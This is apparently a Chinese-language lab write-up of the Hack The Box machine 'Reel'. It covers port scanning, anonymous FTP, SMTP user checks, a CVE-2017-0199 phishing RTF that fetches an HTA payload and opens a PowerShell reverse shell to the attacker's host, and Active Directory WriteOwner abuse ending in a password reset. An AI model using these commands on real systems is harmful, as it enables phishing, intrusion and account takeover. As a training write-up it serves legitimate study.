针对目标服务器进行端口扫描

```
sudo nmap -p- --min-rate 10000 10.10.10.77
```

针对开放端口进行进一步的服务扫描
```
sudo nmap -p21,22,25,135,139,445,593,49159 -A 10.10.10.77 -oX reel.xml

```

10.10.10.77   HTB.LOCAL

优先从21端口开始，根据扫描结果看，FTP21端口允许匿名登录，我们进行登录和查看

![image-20241101112753937](https://s2.loli.net/2024/11/01/RhNZxajufV5ysLo.png)

登录FTP端口发现存在可访问文件，针对可访问文件进行下载

优先针对三个文件进行查看，其中readme.txt内容描述如下：

```
please email me any rtf format procedures - I'll review and convert.

new format / converted documents will be saved here.%
```

说明在外面通过email上传rtf文件后，系统会进行访问，相应的上传文件存放在当前路径，FTP获取readme的路径是documents，说明是在某个用户的documents路径下

使用工具对三个文件的元数据进行检查，发现Windows event forwarding文件存在一个作者：nico@megabank.com

针对SMB服务进行匿名登录尝试

```
smbclient -L //10.10.10.77
```

![image-20241101135955339](https://files.seeusercontent.com/2026/04/07/Ofd2/image-20241101135955339.png)

截止到这一步我们能够想到的就是利用readme的提示来进行远程的RCE，通过谷歌搜索（关键字：Windows RTF exploit RCE），找到一个（https://github.com/bhdresh/CVE-2017-0199?tab=readme-ov-file），下载对应CVE漏洞

首先验证服务端的25服务我们能够给他发送相应的邮件

```
telent 10.10.10.77 25
HELO 123.com
MAIL FROM: <123@megabank.com>
RCPT TO: <nico@megabank.com>
```

![image-20241101150212700](https://s2.loli.net/2024/11/01/3r4OguiER5l7mUo.png)

成功，证明我们之前在元数据中找到的邮箱是真实存在的邮箱，根据GitHub的漏洞指导进行逐步执行

第一步：生成反弹shell和访问反弹shell的文件，我们使用nishang套件中的工具

```
cd /home/zkpc/Tools/nishang
pwsh
Import-Module ./nishang.psm1
Out-HTA -PayloadURL http://10.10.16.8/Invoke-PowerShellTcp.ps1（这里使用out-word也行但需要在Windows下）
mv WindDef_WebInstall.hta /home/zkpc/Documents/hackthebox/Windows/22.Reel/CVE-2017-0199
cd /home/zkpc/Tools/nishang/Shells
mv Invoke-PowerShellTcp.ps1 /home/zkpc/Documents/hackthebox/Windows/22.Reel/CVE-2017-0199
修改Invoke-PowerShellTcp.ps1，在最后一行添加对应的反弹IP及port
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.8 -Port 12345
```

第二步：生成需要发送邮件让目标服务器点击的文件

```
python2 cve-2017-0199_toolkit.py -M gen -t RTF -w Invoice.rtf -u http://10.10.16.8/WindDef_WebInstall.hta
```

第三步：开启http服务器及nc侦听

```
sudo nc -nvlp 12345
sudo python3 -m http.server 80
```

第四步：发送邮件，让对方能够点击钓鱼邮件

```
sendEmail -f 123123@megabank.com -t nico@megabank.com -u "Invoice Attached" -m "You are overdue payment" -a Invoice.rtf -s 10.10.10.77 -v
```

第一步：加载环境和工具

```
#优先加载powerview，该目标机器需要调整脚本加载策略
scp /home/zkpc/Documents/hackthebox/Windows/22.Reel/ssh/PowerView.ps1 tom@10.10.10.77:/c:/users/tom/
Set-ExecutionPolicy -ExecutionPolicy AllSigned -Scope Process
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process
Import-Module .\PowerView.ps1
```

第二步：按照文档开始执行，安装bloodhound的文档不行，按照Google搜索关键字dc writeowner on user（https://cyberkhalid.github.io/posts/ad-writeowner-user/）

```
Set-DomainObjectOwner -identity claire -OwnerIdentity tom
Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-DomainUserPassword -identity claire -accountpassword $SecPassword
```
